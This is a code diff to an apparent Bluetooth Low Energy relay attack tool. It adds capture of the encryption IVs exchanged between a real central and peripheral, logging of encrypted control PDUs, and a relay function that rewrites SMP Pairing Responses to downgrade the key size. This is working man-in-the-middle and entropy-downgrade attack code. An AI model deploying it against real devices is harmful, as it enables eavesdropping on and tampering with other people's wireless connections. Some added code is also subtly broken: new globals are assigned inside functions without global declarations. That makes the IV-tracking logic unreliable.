@@ -83,6 +83,12 @@ enc_start_seen = False          # we have seen LL_START_ENC_REQ from P
 first_enc_rsp_pkt = None        # first non-empty packet after that
 
 
+
+# IVs for building the "real" C<->P IV
+ivm_from_c = None   # IVm from real central C (C -> P_r, LL_ENC_REQ)
+ivs_from_p = None   # IVs from real peripheral P (P -> C_r, LL_ENC_RSP)
+iv_real_cp = None   # IVm_from_c || IVs_from_p
+
 def sigint_handler(sig, frame):
     hw.cancel_recv()
     hw.cmd_chan_aa_phy() # stop scanning or connection
@@ -331,6 +337,36 @@ def _extract_smp_key_size_from_ll_body(ll_body: bytes):
         return (None, None)
     return (smp_code, smp[4])
 
+def _extract_ivm_from_ll_enc_req(ctrl: LlControlMessage):
+    """
+    LL_ENC_REQ (0x03), length 23:
+      [0]   opcode
+      [1:9] Rand
+      [9:11] EDIV
+      [11:19] SKDm
+      [19:23] IVm
+    We just take the last 4 bytes.
+    """
+    body = ctrl.body
+    if ctrl.opcode != 0x03 or len(body) < 23:
+        return None
+    return body[-4:]  # bytes 19..22
+
+
+def _extract_ivs_from_ll_enc_rsp(ctrl: LlControlMessage):
+    """
+    LL_ENC_RSP (0x04), length 13:
+      [0]   opcode
+      [1:9] SKDs
+      [9:13] IVs
+    We just take the last 4 bytes.
+    """
+    body = ctrl.body
+    if ctrl.opcode != 0x04 or len(body) < 13:
+        return None
+    return body[-4:]  # bytes 9..12
+
+
 
 def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     global enc_start_seen, first_enc_rsp_pkt   # <<<
@@ -343,12 +379,26 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
         empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
         block_req = filter_changes and is_param_req(msg)
 
+
+                # --- here: LL_ENC_RSP from *real peripheral* ---
+        if isinstance(msg, LlControlMessage) and msg.opcode == 0x04:
+            ivs = _extract_ivs_from_ll_enc_rsp(msg)
+            if ivs is not None:
+                ivs_from_p = ivs
+                print(f"[IV] IVs from real peripheral (LL_ENC_RSP on P->C_r): {_hx(ivs_from_p)}")
+
+            if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
+                iv_real_cp = ivm_from_c + ivs_from_p
+                print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")
+
+
         # --- detect LL_START_ENC_REQ and first non-empty packet after it ---  # <<<
         if isinstance(msg, LlControlMessage) and msg.opcode == 0x05:           # 0x05 = LL_START_ENC_REQ
             # This is the request from P → C; arm the detector
             enc_start_seen = True
             first_enc_rsp_pkt = None
             print("[ENC] Saw LL_START_ENC_REQ; will mark first non-empty packet as LL_START_ENC_RSP")
+
         elif enc_start_seen and first_enc_rsp_pkt is None and not empty:
             # First non-empty PDU after LL_START_ENC_REQ; treat as LL_START_ENC_RSP
             first_enc_rsp_pkt = msg
@@ -357,6 +407,25 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
             msg.is_first_encrypted = True   # dynamic attribute for debugging
             print("[ENC] First non-empty packet after LL_START_ENC_REQ "
                   "(likely LL_START_ENC_RSP)")
+            pdu = msg.body
+            if len(pdu) < 2:
+                print("[ENC] Warning: PDU too short to have header, skipping")
+            else:
+                # 2-byte data header: pdu[0], pdu[1]
+                length = pdu[1]                 # payload + MIC length
+                payload = pdu[2:2 + length]     # encrypted payload (opcode) + MIC
+
+                if len(payload) < 5:
+                    print(f"[ENC] Unexpected payload length {len(payload)}, expected ≥5")
+                    enc_opcode = payload[:1] if payload else b""
+                    enc_mic    = payload[1:]
+                else:
+                    # For LL_START_ENC_REQ/RSP: 1 byte opcode + 4-byte MIC
+                    enc_opcode = payload[0:1]
+                    enc_mic    = payload[1:5]
+
+                print("[ENC] Encrypted opcode:", _hx(enc_opcode))
+                print("[ENC] Encrypted MIC   :", _hx(enc_mic))
 
         # --------------------------------------------------------------------  # <<<
 
@@ -383,36 +452,64 @@ def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
     print_message(msg, quiet)
 
 
+def sock_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
+    # receive packets from relay slave and retransmit them here
+    mtype, body = conn.recv_msg()
+    if mtype != MessageType.PACKET:
+        return
 
-def ser_recv_print_forward(conn, quiet, new_key_size, filter_changes=False):
-    msg = hw.recv_and_decode()
+    # Keep a copy of the original [event_le16][LL body ...]
+    old_packet = body
 
-    if isinstance(msg, PacketMessage):
-        msg = DPacketMessage.decode(msg)
-        # only forward non-empty data
-        empty = isinstance(msg, LlDataContMessage) and msg.data_length == 0
-        block_req = filter_changes and is_param_req(msg)
+    # Downgrade entropy if this is an SMP Pairing Response coming from the relay slave
+    new_packet, changed = downgrade_pairing_response(body, new_key_size)
+    body = new_packet
+    if changed:
+        # Compare LL bodies (skip the 2-byte event header)
+        old_ll = old_packet[2:]
+        new_ll = new_packet[2:]
 
-        # Try to downgrade entropy on outgoing DataMessage LL bodies
-        if not empty and not block_req and isinstance(msg, DataMessage):
-            old_body = msg.body
-            new_ll, changed = downgrade_pairing_request(old_body, new_key_size)
-            if changed:
-                # Best-effort: print SMP code and key sizes before/after
-                old_code, old_ks = _extract_smp_key_size_from_ll_body(old_body)
-                new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
-                # Human-friendly name
-                code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
-                print(f"[DOWNGRADE] {code_name}: key size {old_ks} -> {new_ks}")
-                print(f"  old LL body ({len(old_body)} bytes): {_hex_bytes(old_body)}")
-                print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
-                msg.body = new_ll
-                # Also rewrite SMP Confirm/Random in periph->central direction
-        if block_req:
-            # LL_REJECT_EXT_IND, unacceptable connection parameters
-            hw.cmd_transmit(3, b'\x11\x0F\x3B')
+        old_code, old_ks = _extract_smp_key_size_from_ll_body(old_ll)
+        new_code, new_ks = _extract_smp_key_size_from_ll_body(new_ll)
+        code_name = {0x01: "Pairing Request", 0x02: "Pairing Response"}.get(old_code, "SMP")
 
-    print_message(msg, quiet)
+        # Guard against any unexpected None values (shouldn't happen if changed=True)
+        if old_ks is None or new_ks is None:
+            print("[DOWNGRADE] SMP key size changed (peripheral -> master).")
+        else:
+            print(f"[DOWNGRADE] {code_name} (from peripheral): key size {old_ks} -> {new_ks}")
+        print(f"  old LL body ({len(old_ll)} bytes): {_hex_bytes(old_ll)}")
+        print(f"  new LL body ({len(new_ll)} bytes): {_hex_bytes(new_ll)}")
+
+    # Unpack event and proceed as before
+    event, = unpack('<H', body[:2])
+    body = body[2:]
+    llid = body[0] & 3
+    pdu = body[2:]
+    # construct packet object for display and PCAP
+    pkt = DPacketMessage.from_body(body, True)
+    pkt.ts_epoch = time()
+    pkt.ts = pkt.ts_epoch - hw.decoder_state.first_epoch_time
+    pkt.aa = hw.decoder_state.cur_aa
+    pkt.event = event
+
+    # --- here: LL_ENC_REQ from *real central* ---
+    if isinstance(pkt, LlControlMessage) and pkt.opcode == 0x03:
+        ivm = _extract_ivm_from_ll_enc_req(pkt)
+        if ivm is not None:
+            ivm_from_c = ivm
+            print(f"[IV] IVm from real central (LL_ENC_REQ on C->P_r): {_hx(ivm_from_c)}")
+
+        if ivm_from_c is not None and ivs_from_p is not None and iv_real_cp is None:
+            iv_real_cp = ivm_from_c + ivs_from_p
+            print(f"[IV] Combined real C<->P IV (IVm||IVs): {_hx(iv_real_cp)}")
+
+
+    # Passing on PDUs with instants in the past would break the connection
+    if not (filter_changes and has_instant(pkt)):
+        hw.cmd_transmit(llid, pdu, event)
+    print_message(pkt, quiet)
+
 
 def print_message(msg, quiet=False):
     if isinstance(msg, DPacketMessage):
